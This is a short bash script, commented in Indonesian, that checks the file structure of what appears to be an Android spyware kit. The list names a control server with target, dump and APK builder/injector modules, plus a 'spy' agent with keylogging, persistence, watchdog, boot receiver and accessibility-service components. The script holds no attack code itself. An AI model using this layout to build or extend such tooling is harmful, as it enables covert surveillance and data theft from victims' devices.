#!/usr/bin/env bash
# Cek kelengkapan file wajib.
set -uo pipefail
R='\033[1;31m'; G='\033[1;32m'; N='\033[0m'
cd "$(dirname "$0")/.."

miss=0
need=(
  "server/main.py" "server/config.py" "server/db.py" "server/security.py"
  "server/ws.py" "server/ipgeo.py" "server/builder.py" "server/injector.py"
  "server/branding.py" "server/signer.py" "server/api_targets.py"
  "server/api_control.py" "server/api_dump.py" "server/api_build.py"
  "server/api_admin.py" "server/api_ios.py"
  "web/login.html" "web/dashboard.html" "web/targets.html" "web/build.html"
  "web/dumps.html" "web/admin.html" "web/agent.html" "web/403.html"
  "web/static/css/style.css" "web/static/img/garuda.svg"
  "web/static/js/core.js" "web/static/js/ws.js"
  "agent/app/src/main/AndroidManifest.xml"
  "agent/app/src/main/java/ai/m4zk1play/spy/KeylogService.java"
  "agent/app/src/main/java/ai/m4zk1play/spy/Persist.java"
  "agent/app/src/main/java/ai/m4zk1play/spy/Watchdog.java"
  "agent/app/src/main/java/ai/m4zk1play/spy/MzkFiles.java"
  "agent/app/src/main/java/ai/m4zk1play/spy/BootReceiver.java"
  "agent/app/src/main/res/xml/mzk_accessibility.xml"
  "agent/app/src/main/res/xml/network_security_config.xml"
  "agent/app/src/main/res/values/strings.xml"
  "scripts/build-agent.sh" "scripts/verify.sh"
  "docs/PERSISTENSI.md" "docs/FIX-1.4.1.md"
)

for f in "${need[@]}"; do
  if [[ -f "$f" ]]; then echo -e "${G}[ADA]${N} $f"; else echo -e "${R}[HILANG]${N} $f"; miss=$((miss+1)); fi
done

for f in agent/prebuilt/agent.apk agent/prebuilt/template.apk; do
  if [[ -f "$f" ]]; then echo -e "${G}[ADA]${N} $f"; else echo -e "${R}[HILANG]${N} $f"; fi
done

echo
if [[ $miss -gt 0 ]]; then echo -e "${R}$miss file hilang.${N}"; exit 1; fi
echo -e "${G}Struktur lengkap.${N}"
